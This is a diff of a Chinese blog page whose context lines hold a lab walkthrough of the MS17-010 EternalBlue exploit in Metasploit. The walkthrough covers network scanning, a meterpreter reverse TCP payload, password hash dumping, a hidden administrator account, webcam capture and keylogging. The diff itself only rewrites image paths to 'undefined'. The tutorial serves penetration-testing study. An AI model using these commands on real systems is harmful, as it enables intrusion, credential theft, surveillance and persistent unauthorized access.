@@ -190,111 +190,111 @@
 <p>1.确保靶机和攻击机在同一个局域网，先查看攻击机的地址</p>
 <p>ifconfig</p>
 <p>攻击机地址为 192.168.0.10</p>
-<img src="/p/8f17ee8c/1.png" class="">
+<img src="/p/undefined/1.png" class="">
 
 <p>2.使用Nmap工具扫描攻击机所在内网段，查找目标主机是否存活</p>
 <p>nmap -sP 192.168.0.0/24</p>
 <p>发现靶机 192.168.0.107</p>
-<img src="/p/8f17ee8c/2.png" class="">
+<img src="/p/undefined/2.png" class="">
 
 <p>3.打开渗透工具</p>
 <p>msfconsole</p>
-<img src="/p/8f17ee8c/3.png" class="">
+<img src="/p/undefined/3.png" class="">
 
 <p>4.搜索漏洞MS17-010</p>
 <p>search ms17-010</p>
-<img src="/p/8f17ee8c/4.png" class="">
+<img src="/p/undefined/4.png" class="">
 
 <p>5.选择攻击模块2</p>
 <p>use 2 或者use exploit/windows/smb/ms17_010_eternalblue</p>
-<img src="/p/8f17ee8c/5.png" class="">
+<img src="/p/undefined/5.png" class="">
 
-<img src="/p/8f17ee8c/6.png" class="">
+<img src="/p/undefined/6.png" class="">
 
 <p>6.查看需要配置的信息</p>
 <p>show options</p>
-<img src="/p/8f17ee8c/7.png" class="">
+<img src="/p/undefined/7.png" class="">
 
-<img src="/p/8f17ee8c/8.png" class="">
+<img src="/p/undefined/8.png" class="">
 
 <p>7.配置需要配置的RHOSTS为靶机的地址</p>
 <p>set RHOSTS 192.168.0.107</p>
-<img src="/p/8f17ee8c/9.png" class="">
+<img src="/p/undefined/9.png" class="">
 
 <p>8.设置攻击载荷 tcp反向链接</p>
 <p>set payload windows/x64/meterpreter/reverse_tcp</p>
-<img src="/p/8f17ee8c/10.png" class="">
+<img src="/p/undefined/10.png" class="">
 
 <p>9.实施攻击（要关闭靶机的防火墙，不然会失败）</p>
 <p>run 或者 exploit</p>
-<img src="/p/8f17ee8c/11.png" class="">
+<img src="/p/undefined/11.png" class="">
 
 <p>10.渗透后利用</p>
 <p>a.截取靶机屏幕 screenshot</p>
-<img src="/p/8f17ee8c/12.png" class="">
+<img src="/p/undefined/12.png" class="">
 
-<img src="/p/8f17ee8c/14.png" class="">
+<img src="/p/undefined/14.png" class="">
 
 <p>b.从攻击机上传文件到靶机</p>
 <p>upload /root/ppp.jpeg C:\看不见我.jpeg</p>
-<img src="/p/8f17ee8c/15.png" class="">
+<img src="/p/undefined/15.png" class="">
 
-<img src="/p/8f17ee8c/16.png" class="">
+<img src="/p/undefined/16.png" class="">
 
 <p>从靶机下载文件到攻击机</p>
 <p>download C:\11.jpeg /root</p>
 <p>download C:\11.exe /root</p>
-<img src="/p/8f17ee8c/17.png" class="">
+<img src="/p/undefined/17.png" class="">
 
-<img src="/p/8f17ee8c/18.png" class="">
+<img src="/p/undefined/18.png" class="">
 
 <p>c.查看账户和密码并使用工具在线解密工具解密//也可以使用kali自带的ophcrack工具进行解密（这个要自己下载彩虹表）</p>
 <p>hashdump</p>
-<img src="/p/8f17ee8c/19.png" class="">
+<img src="/p/undefined/19.png" class="">
 
 <p>打开一个新的命令窗口 输入ophcrack，将hash值复制过来，点击crack就可以爆破（我没有下载彩虹表，所以我采用在线工具破解，但是我的账户本来就没有设置密码，所以结果为空）</p>
-<img src="/p/8f17ee8c/20.png" class="">
+<img src="/p/undefined/20.png" class="">
 
-<img src="/p/8f17ee8c/21.png" class="">
+<img src="/p/undefined/21.png" class="">
 
 <p>d. shell新增账户并远程登录目标主机</p>
 <p>新建一个简单隐藏用户admin$ 密码为admin //用命令查看看不到改用户</p>
-<img src="/p/8f17ee8c/22.png" class="">
+<img src="/p/undefined/22.png" class="">
 
-<img src="/p/8f17ee8c/23.png" class="">
+<img src="/p/undefined/23.png" class="">
 
 <p>将用户admin$添加到administrator组</p>
 <p>net localgroup administrators admin$ /add</p>
-<img src="/p/8f17ee8c/24.png" class="">
+<img src="/p/undefined/24.png" class="">
 
 <p>开启远程管理服务</p>
-<img src="/p/8f17ee8c/25.png" class="">
+<img src="/p/undefined/25.png" class="">
 
 <p>通过物理机进行远程登录（这个要靶机同意，有点鸡肋）</p>
-<img src="/p/8f17ee8c/26.png" class="">
+<img src="/p/undefined/26.png" class="">
 
-<img src="/p/8f17ee8c/27.png" class="">
+<img src="/p/undefined/27.png" class="">
 
 <p>e.开启摄像头</p>
 <p>webcam_snap –&gt;通过摄像头拍照</p>
-<img src="/p/8f17ee8c/29.png" class="">
+<img src="/p/undefined/29.png" class="">
 
-<img src="/p/8f17ee8c/30.png" class="">
+<img src="/p/undefined/30.png" class="">
 
 <p>webcam_stream –&gt;通过摄像头开启视频(这个就不演示了，保留一点神秘)</p>
 <p>f.监听键盘</p>
 <p>ps查看进程号，找到explorer.exe</p>
-<img src="/p/8f17ee8c/31.png" class="">
+<img src="/p/undefined/31.png" class="">
 
 <p>迁移进程</p>
 <p>migrate 1408</p>
-<img src="/p/8f17ee8c/32.png" class="">
+<img src="/p/undefined/32.png" class="">
 
 <p>keyscan_start监听键盘</p>
-<img src="/p/8f17ee8c/33.png" class="">
+<img src="/p/undefined/33.png" class="">
 
 <p>keyscan_dump查看键盘输入的内容</p>
-<img src="/p/8f17ee8c/34.png" class="">
+<img src="/p/undefined/34.png" class="">
 
 <p>总结:这个渗透攻击的重点在于渗透后的利用，这里只是举出了一小部分例子，可以自己研究研究还可以实现哪些操作。</p>
 
@@ -305,7 +305,7 @@
     <ul>
         
         <li class="prev">
-            <a href="/p/8f17ee8a.html">
+            <a href="/p/undefined.html">
                 <i class="cube-icon cube-prev" aria-hidden="true"></i>
                 MSF上线
             </a>
@@ -410,7 +410,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/p/8f17ee8a.html" title="MSF上线">MSF上线</a>
+                    <a href="/p/undefined.html" title="MSF上线">MSF上线</a>
                 </p>
             </div>
         </li>
@@ -423,7 +423,7 @@
                     <span>3</span>
                 </p>
                 <p class="title">
-                    <a href="/p/8f17ee8c.html" title="MS17-010">MS17-010</a>
+                    <a href="/p/undefined.html" title="MS17-010">MS17-010</a>
                 </p>
             </div>
         </li>
@@ -443,7 +443,7 @@
     <div class="cube-boxs">
         
         
-        <div class="cube-box ">
+        <div class="cube-box-bg ">
             <a href="/tags/%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%80%83%EF%BC%81%EF%BC%81%EF%BC%81/">#仅供学习参考！！！</a>
         </div>
         
